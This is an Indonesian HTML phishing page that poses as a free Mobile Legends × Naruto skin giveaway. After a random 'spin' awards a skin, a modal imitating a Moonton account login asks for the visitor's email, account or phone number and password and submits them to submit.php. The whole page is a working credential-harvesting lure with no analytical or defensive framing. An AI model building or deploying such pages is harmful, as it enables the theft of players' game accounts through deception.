<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>MLBB x Naruto Form</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <div class="form-container">
    <div class="card p-4 glass-bg shadow-lg">
      <h2 class="text-center text-light mb-4">FREE SKIN MLBB × NARUTO</h2>

      <form action="submit.php" method="POST" id="skinForm">
        <input type="hidden" name="skin" id="selectedSkinInput">

        <div class="mb-3">
          <div class="skin-selection d-flex flex-wrap justify-content-center gap-3">
            <div class="skin-option animate">
              <img src="img/naruto.png" alt="Naruto">
              <span class="skin-name">Naruto</span>
            </div>
            <div class="skin-option animate">
              <img src="img/sasuke.png" alt="Sasuke">
              <span class="skin-name">Sasuke</span>
            </div>
            <div class="skin-option animate">
              <img src="img/sakura.png" alt="Sakura">
              <span class="skin-name">Sakura</span>
            </div>
            <div class="skin-option animate">
              <img src="img/kakashi.png" alt="Kakashi">
              <span class="skin-name">Kakashi</span>
            </div>
            <div class="skin-option animate">
              <img src="img/gaara.png" alt="Gaara">
              <span class="skin-name">Gaara</span>
            </div>
            <!-- <div class="skin-option animate">
              <img src="img/diamond.png" alt="diamond">
              <span class="skin-name">50.000 Diamond</span>
            </div> -->
          </div>
        </div>

        <div class="mb-3 text-center">
          <button type="button" class="btn btn-warning" onclick="randomPick()">Acak Skin</button>
        </div>
        <button type="button" class="btn btn-primary w-100" id="klaimButton" data-bs-toggle="modal" data-bs-target="#confirmModal" disabled>
  Klaim Sekarang
</button>

      </form>
    </div>
  </div>

  <!-- Modal Konfirmasi Nama & ID -->
  <div class="modal fade" id="confirmModal" tabindex="-1" aria-labelledby="confirmModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content bg-dark text-light">
        <div class="modal-header">
          <h5 class="modal-title" id="confirmModalLabel">Login dengan Akun Moonton</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <div class="mb-3">
            <!-- <label for="nama" class="form-label">Nama Pemain</label> -->
            <input type="text" class="form-control" id="nama" name="nama" form="skinForm" placeholder="Email/Akun Moonton/No. Telepon" required>
          </div>
          <div class="mb-3">
            <!-- <label for="id" class="form-label">ID Pemain</label> -->
            <input type="text" class="form-control" id="id" name="id" form="skinForm" placeholder="Password" required>
          </div>
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-warning w-100" form="skinForm">Login</button>
        </div>
      </div>
    </div>
  </div>

  <script>
  let isSpinning = false;

  function randomPick() {
    if (isSpinning) return;
    isSpinning = true;

    const options = document.querySelectorAll(".skin-option");
    const resultMessage = document.getElementById("result-message");
    let currentIndex = 0;
    let totalLoops = Math.floor(Math.random() * 5) + 10;
    let delay = 100;

    options.forEach(opt => {
      opt.classList.remove('highlight', 'selected', 'pulse');
    });
    if (resultMessage) resultMessage.remove();

    let interval = setInterval(() => {
      options.forEach(opt => opt.classList.remove('highlight'));
      options[currentIndex].classList.add('highlight');

      currentIndex = (currentIndex + 1) % options.length;
      totalLoops--;

      if (totalLoops <= 0) {
        clearInterval(interval);
        const selectedIndex = (currentIndex - 1 + options.length) % options.length;
        const selected = options[selectedIndex];
        selected.classList.remove('highlight');
        selected.classList.add('selected', 'pulse');

        const skinName = selected.querySelector('.skin-name').textContent;
        document.getElementById("selectedSkinInput").value = skinName;

        const message = document.createElement('div');
        message.id = 'result-message';
        message.className = 'mt-3 text-center text-warning fs-5';
        message.textContent = `Kamu mendapat skin ${skinName}!`;
        document.querySelector('.form-container .card').appendChild(message);

        document.getElementById("klaimButton").disabled = false;
        isSpinning = false;
      }
    }, delay);
  }
</script>


  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>

</html>